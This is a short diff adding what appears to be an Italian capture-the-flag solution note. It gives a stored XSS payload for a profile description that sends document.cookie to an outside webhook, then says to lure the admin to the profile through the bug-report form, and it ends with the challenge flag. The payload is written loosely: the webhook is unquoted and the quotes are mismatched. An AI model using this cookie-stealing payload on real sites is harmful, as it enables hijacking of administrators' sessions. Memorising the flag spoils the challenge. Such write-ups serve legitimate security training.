@@ -1,0 +1,6 @@
+modificare la descrizione del profilo personale in <script>fetch(webhook/?cookie=' + encodeURIComponent(document.cookie))</script>
+
+poi andare nel report bug e inserire il link per il proprio profilo in modo che l'admin visiti la pagina e mandi il cookie al webhook
+
+
+flag{c00ki3s_4r3_d4Ng3r0uS_Wh3n_Th3y_m33t_XSS}
